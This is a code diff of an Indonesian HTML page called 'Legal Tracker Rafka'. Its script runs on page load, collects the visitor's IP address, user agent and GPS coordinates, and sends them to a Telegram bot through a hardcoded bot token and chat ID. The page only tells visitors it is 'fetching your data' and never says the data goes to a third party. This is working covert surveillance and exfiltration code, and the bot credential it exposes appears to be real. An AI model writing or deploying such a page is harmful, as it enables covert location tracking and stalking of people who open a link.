@@ -1,67 +1,77 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>Info Visitor Tracker</title>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <title>Legal Tracker Rafka</title>
   <style>
-    body {
-      background: black;
-      color: #00ff00;
-      font-family: monospace;
-      text-align: center;
-      padding: 30px;
-    }
-    .box {
-      border: 1px solid #00ff00;
-      padding: 15px;
-      display: inline-block;
-      margin-top: 20px;
-    }
+    body { background: black; color: lime; font-family: monospace; text-align: center; padding: 40px; }
+    .box { border: 1px solid lime; padding: 20px; display: inline-block; margin-top: 20px; }
   </style>
 </head>
 <body>
-  <h1>👨‍💻 Menghubungkan...</h1>
-  <p>Harap tunggu...</p>
-  <div class="box" id="info"></div>
+  <div class="box">
+    <h1>📡 Mengambil data kamu...</h1>
+    <p id="info">Tunggu sebentar...</p>
+  </div>
 
   <script>
-    async function sendToTelegram(ip, userAgent, lat, lon) {
-      const token = "8113101605:AAELCPTCdr4cEBe6opWXY7Rg5UEM969iPUM";
-      const chatId = "7932600874";
-      const text = `🌐 IP: ${ip}%0A📍 Lokasi: ${lat}, ${lon}%0A🧠 User-Agent: ${userAgent}`;
-      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`;
-      await fetch(url);
-    }
+    const token = "8113101605:AAELCPTCdr4cEBe6opWXY7Rg5UEM969iPUM";
+    const chatId = "7932600874";
 
-    async function getInfo() {
-      const userAgent = navigator.userAgent;
-      let ip = "Tidak diketahui";
-      let lat = "Tidak diketahui", lon = "Tidak diketahui";
-
+    async function getIP() {
       try {
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-        ip = ipData.ip;
-      } catch {}
-
-      try {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-          lat = pos.coords.latitude;
-          lon = pos.coords.longitude;
-          document.getElementById("info").innerHTML = `IP: ${ip}<br>Lokasi: ${lat}, ${lon}<br>User-Agent: ${userAgent}`;
-          await sendToTelegram(ip, userAgent, lat, lon);
-        }, async () => {
-          document.getElementById("info").innerHTML = `IP: ${ip}<br>Lokasi: Tidak diizinkan<br>User-Agent: ${userAgent}`;
-          await sendToTelegram(ip, userAgent, "Tidak diizinkan", "Tidak diizinkan");
-        });
-      } catch {
-        document.getElementById("info").innerHTML = `IP: ${ip}<br>Lokasi: Error<br>User-Agent: ${userAgent}`;
-        await sendToTelegram(ip, userAgent, "Error", "Error");
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch (e) {
+        return "Tidak ditemukan";
       }
     }
 
-    getInfo();
+    function getLocation() {
+      return new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve(pos.coords),
+          (err) => reject("Lokasi tidak diizinkan")
+        );
+      });
+    }
+
+    async function jalankan() {
+      const ip = await getIP();
+      const ua = navigator.userAgent;
+      let info = `IP: ${ip}<br>User-Agent: ${ua}<br>`;
+      let lat = "-", lon = "-", akurasi = "-";
+
+      try {
+        const loc = await getLocation();
+        lat = loc.latitude;
+        lon = loc.longitude;
+        akurasi = loc.accuracy;
+        info += `Lokasi: ${lat}, ${lon}<br>Akurasi: ${akurasi}m`;
+      } catch (err) {
+        info += `<br><i>${err}</i>`;
+      }
+
+      document.getElementById("info").innerHTML = info;
+
+      const pesan = `📡 *Legal Tracker*
+🌐 IP: ${ip}
+📍 Lokasi: ${lat}, ${lon} (akurasi: ${akurasi}m)
+🧠 User-Agent: ${ua}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: pesan,
+          parse_mode: "Markdown"
+        })
+      });
+    }
+
+    jalankan();
   </script>
 </body>
 </html>
